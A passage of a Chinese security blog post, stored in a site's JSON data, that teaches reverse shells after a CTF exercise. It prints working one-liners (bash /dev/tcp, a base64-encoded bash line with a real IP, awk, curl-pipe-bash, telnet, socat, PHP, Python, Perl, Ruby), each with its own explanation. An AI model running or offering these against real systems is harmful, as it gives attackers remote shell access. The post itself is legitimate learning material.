aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150361.png\" alt=\"在这里插入图片描述\"><br>目标机，执行bash语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">/</span><span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150401.png\" alt=\"在这里插入图片描述\"><br>出现了点bug，百度过后说是因为shell由bash解析，有时候是由zsh或sh解析，所以不一定会执行，但是我试了试发现把它进行base64加密后，这样就可以执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>c <span class=\"token string single-quoted-string\">'&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEzNC4yMTIuMjI1LjE0Mi83Nzc3IDA+JjEgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解释一下，bash -c参数后接一个指令，然后会执行这个语句<br>base64解密后就是<code>/bin/bash -i &gt;&amp; /dev/tcp/134.212.225.142/7777 0&gt;&amp;1  </code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150653.png\" alt=\"在这里插入图片描述\"></p>\n<p>此时再查看攻击机<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150744.png\" alt=\"在这里插入图片描述\"><br>成功反弹shell</p>\n<h3 id=\"awk\"><a href=\"#awk\" class=\"headerlink\" title=\"awk\"></a>awk</h3><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。<br>这里我们用的话其实也就是用到了一个他的for循环这些基础知识，有兴趣的师傅们可以参考这篇文章来具体的了解awk<br><a href=\"https://github.com/mylxsw/growing-up/blob/master/doc/%E4%B8%89%E5%8D%81%E5%88%86%E9%92%9F%E5%AD%A6%E4%BC%9AAWK.md\">https://github.com/mylxsw/growing-up/blob/master/doc</a><br>这里我先将语句列出，而后再进行解释</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">awk <span class=\"token string single-quoted-string\">'BEGIN&#123;s=\"/inet/tcp/0/IP/Port\";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>BEGIN语句块在程序开始的使用执行，它只执行一次,BEGIN中的内容是awk要执行的命令，那么这里的话就是与攻击机的某个端口进行了tcp链接，而后你可以看见是一个for循环，初始化内容为空，然后条件对应的内容是读取s放入变量c中，然后增量是每次关闭c管道。接下来是一个while循环，条件对应的内容是读取c放入$0中，如果满足就输出，否则就关闭s管道</p>\n<p>注：参考了很多师傅的博客，但感觉还是理解有点问题，还请各位师傅多多指正</p>\n<h4 id=\"demo-2\"><a href=\"#demo-2\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机，开启监听<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150760.png\" alt=\"在这里插入图片描述\"><br>目标机，调用awk语句，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">awk <span class=\"token string single-quoted-string\">'BEGIN&#123;s=\"/inet/tcp/0/xxx.xxx.xxx.xxx/7777\";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150792.png\" alt=\"在这里插入图片描述\"><br>此时再看攻击机<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150924.png\" alt=\"在这里插入图片描述\"><br>成功反弹shell</p>\n<h3 id=\"Curl结合Bash进行反弹shell\"><a href=\"#Curl结合Bash进行反弹shell\" class=\"headerlink\" title=\"Curl结合Bash进行反弹shell\"></a>Curl结合Bash进行反弹shell</h3><p>这个就是用于绕过的，当目标机存在某些防护过滤了一些字符时，我们可以通过这个来实现反弹shell，语句如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">curl <span class=\"token class-name\">ip</span><span class=\"token operator\">|</span><span class=\"token class-name\">bash</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>它的话其实就是以bash解析shell，对ip进行curl指令，即请求这个ip，然后我们的这个ip的内容是bash反弹shell的语句，即</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">bash <span class=\"token operator\">-</span>i<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">/</span><span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时就可以绕过防护且成功反弹shell，这个时候也就应该可以理解上文的绕过方式了</p>\n<h4 id=\"demo-3\"><a href=\"#demo-3\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机<br>首先上准备一个界面，其内容是bash反弹shell语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150040.png\" alt=\"在这里插入图片描述\"><br>然后接下来去监听7777端口<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150140.png\" alt=\"在这里插入图片描述\"><br>目标机:<br>开始curl语句请求对应端口<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150202.png\" alt=\"在这里插入图片描述\"><br>接下来查看攻击机<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150394.png\" alt=\"在这里插入图片描述\"><br>成功反弹shell，可以执行语句</p>\n<h3 id=\"Talent\"><a href=\"#Talent\" class=\"headerlink\" title=\"Talent\"></a>Talent</h3><p>Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。 它为用户提供了在本地计算机上完成远程主机工作的能力。<br>这里的话有两种方法，先介绍第一种方式<br>第一种方式的话<br>先给出参考payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">telnet xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx <span class=\"token class-name\">port</span><span class=\"token operator\">|</span> <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span><span class=\"token class-name\">bash</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">telnet</span> xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx port2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个的话就是用talnet主动连接攻击机的某个端口，然后将输出信息作为bash的输入，即用bash执行其输出信息，接下来用管道符将bash的输出重定向到talnet连接的攻击机的另一个端口下，其实也就是将回显输出到这个端口下了，此时实现了攻击机port端口执行的语句，在port2端口可以看到回显信息</p>\n<p>第二种方式<br>先给出参考payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mknod a p<span class=\"token punctuation\">;</span> telnet xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx port <span class=\"token number\">0</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">a</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">bin</span><span class=\"token operator\">/</span>bash <span class=\"token number\">1</span><span class=\"token operator\">></span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>就是创建一个管道a，然后用talent与攻击机的某个端口进行连接，再用重定向将标准输入定向到管道a中，接下来再用管道符<code>|</code>，将左边的输出作为右边的输入，也就是说用bash执行talent的输出信息，然后1&gt;a，就是将标准输出重定向到a，这个时候就实现了标准输入和输出都在同一个管道下</p>\n<h4 id=\"demo-4\"><a href=\"#demo-4\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机<br>监听两个端口，一个用于执行指令，一个用于查看回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span>\nnc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">6379</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150315.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150572.png\" alt=\"在这里插入图片描述\"><br>目标机<br>用talent发送两个请求，分别请求攻击机的两个端口，一个用于将bash终端发送出去，一个用于获取bash的输出信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">telnet xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx <span class=\"token number\">7777</span> <span class=\"token operator\">|</span> <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span><span class=\"token class-name\">bash</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">telnet</span> xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx <span class=\"token number\">6379</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时查看攻击机，发现成功连接，执行命令<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150634.png\" alt=\"在这里插入图片描述\"><br>查看另一个端口<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150727.png\" alt=\"在这里插入图片描述\"><br>成功反弹shell</p>\n<h4 id=\"demo2\"><a href=\"#demo2\" class=\"headerlink\" title=\"demo2\"></a>demo2</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这个需要是root权限，普通用户没有权限执行mknod命令</p></blockquote>\n<p>攻击机，开启监听<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150705.png\" alt=\"在这里插入图片描述\"><br>目标机，用重定向将输入输出定向到同一个管道中，同时用telent主动连接攻击机</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mknod a p<span class=\"token punctuation\">;</span> telnet xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx <span class=\"token number\">7777</span> <span class=\"token number\">0</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">a</span> <span class=\"token operator\">|</span> <span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>bash <span class=\"token number\">1</span><span class=\"token operator\">></span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150744.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150061.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Socat\"><a href=\"#Socat\" class=\"headerlink\" title=\"Socat\"></a>Socat</h3><p>Socat，全称<code>Socket CAT</code>，其功能类似于<code>netcat</code><br>这个的话是我们需要提前安装的，那想要利用这个实现反弹shell的话，就需要目标机有这个环境<br>这个怎么安装呢，用<code>apt-get install Socat</code>即可<br>接下来说一下它的思路，其实就是利用<code>Socat</code>向攻击机某个端口发送请求，然后用exec执行语句，得到bash交换环境</p>\n<h4 id=\"demo-5\"><a href=\"#demo-5\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>攻击机，开启监听<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150006.png\" alt=\"在这里插入图片描述\"><br>目标机，用socat连接ip连接，用exec搭建bash交互环境，执行语句如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">socat tcp<span class=\"token operator\">-</span>connect<span class=\"token punctuation\">:</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token operator\">.</span>xxx<span class=\"token punctuation\">:</span><span class=\"token number\">7777</span> exec<span class=\"token punctuation\">:</span><span class=\"token string single-quoted-string\">'bash -li'</span><span class=\"token punctuation\">,</span>pty<span class=\"token punctuation\">,</span>stderr<span class=\"token punctuation\">,</span>setsid<span class=\"token punctuation\">,</span>sigint<span class=\"token punctuation\">,</span>sane <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150053.png\" alt=\"在这里插入图片描述\"><br>此时查看攻击机<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150175.png\" alt=\"在这里插入图片描述\"><br>成功执行</p>\n<h2 id=\"脚本类反弹shell\"><a href=\"#脚本类反弹shell\" class=\"headerlink\" title=\"脚本类反弹shell\"></a>脚本类反弹shell</h2><p>当目标机存在一些语言环境时，也可以借助对应语言脚本来实现反弹shell，这里给出一些网上常见的反弹shell语句，仅供参考</p>\n<p>PHP语言反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">php <span class=\"token operator\">-</span>r <span class=\"token string single-quoted-string\">'$sock=fsockopen(\"IP\",\"Port\");exec(\"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3\");'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>Python反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python <span class=\"token operator\">-</span>c <span class=\"token string single-quoted-string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>Perl反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">perl <span class=\"token operator\">-</span>e <span class=\"token string single-quoted-string\">'use Socket;$i=\"IP\";$p=Port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"/bin/bash -i\");&#125;;'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>ruby反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e <span class=\"token string single-quoted-string\">'c=TCPSocket.new(\"IP\",\"Port\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h1 id=\"后文\"><a href=\"#后文\" class=\"headerlink\" title=\"后文\"></a>后文</h1><p>这里的话也是将网络中较常见的反弹shell简单总结了一下，如果有问题的话还请各位师傅多多指教。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://xz.aliyun.com/t/2549\">https://xz.aliyun.com/t/2549</a><br><a href=\"https://www.freebuf.com/articles/network/334613.html\">https://www.freebuf.com/articles/network/334613.html</a><br><a href=\"https://www.modb.pro/db/421543\">https://www.modb.pro/db/421543</a><br><a href=\"https://www.jianshu.com/p/37924017feb1\">https://www.jianshu.com/p/37924017feb1</a><br><a href=\"https://www.freebuf.com/articles/web/247967.html\">https://www.freebuf.com/articles/web/247967.html</a><br><a href=\"https://www.anquanke.com/post/id/87017\">https://www.anquanke.com/post/id/87017</a><br><a href=\"https://blog.csdn.net/weixin_44288604/article/details/111740527\">https://blog.csdn.net/weixin_44288604/article/details/111740527</a></p>\n","feature":true,"text":"前言最近在帮一位大师傅测试招新赛的时候，发现自己对反弹shell是不太了解的，因此在用反弹shell解题过后，来对反弹shell进行相关学习，希望对各位师傅有所帮助。 题目首先这里给出题目代码 &lt;?php if(isset($_GET['cmd']))&#123; $cmd...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"命令执行","slug":"命令执行","count":1,"path":"api/categories/命令执行.json"}],"tags":[{"name":"反弹shell","slug":"反弹shell","count":1,"path":"api/tags/反弹shell.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE\"><span class=\"toc-text\">题目</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%B9%89\"><span class=\"toc-text\">定义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%8E%9F%E5%9B%A0\"><span class=\"toc-text\">利用原因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BC%B9Shell%E8%AF%AD%E5%8F%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">常见的反弹Shell语句原理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Nc\"><span class=\"toc-text\">Nc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Bash\"><span class=\"toc-text\">Bash</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-1\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#awk\"><span class=\"toc-text\">awk</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-2\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Curl%E7%BB%93%E5%90%88Bash%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">Curl结合Bash进行反弹shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-3\"><span class=\"toc-text\">demo</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Talent\"><span class=\"toc-text\">Talent</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-4\"><span class=\"toc-text\">demo</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo2\"><span class=\"toc-text\">demo2</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Socat\"><span class=\"toc-text\">Socat</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#demo-5\"><span class=\"toc-text\">demo</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">脚本类反弹shell</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E6%96%87\"><span class=\"toc-text\">后文</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"初探Mysql反向读取文件","uid":"5a86b73daf28f7e8c8ac977d8c647c4e","slug":"初探Mysql反向读取文件","date":"2022-10-29T06:55:30.000Z","updated":"2023-03-14T07:10:02.000Z","comments":true,"path":"api/articles/初探Mysql反向读取文件.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141509093.png","text":"声明文章首发于FreeBuf社区https://www.freebuf.com/articles/web/348248.html 前言Mysql反向读取文件感觉蛮有意思的，进行了解过后，简单总结如下，希望能对在学习Mysql反向读取文件的师傅有些许帮助。 前置知识在Mysql中存...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"Mysql","slug":"Mysql","count":1,"path":"api/categories/Mysql.json"}],"tags":[{"name":"蜜罐","slug":"蜜罐","count":1,"path":"api/tags/蜜罐.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":false},"next_post":{"title":"Python 反序列化浅析","uid":"7c4cd24912c14890fdfeed8e71bda8c9","slug":"Python 反序列化浅析","date":"2022-10-14T18:04:30.000Z","updated":"2023-03-14T07:32:04.000Z","comments":true,"path":"api/articles/Python 反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141531600.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1782/ 前言之前所接触的大多是PHP 反序列化题型，最近遇见了一道Python pickle反序列化类型题，因此学习了一下其反序列化，简单总结如下，希望能对各位师傅有所帮助。 Pickle师傅们可自...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"Python","slug":"Python","count":1,"path":"api/categories/Python.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}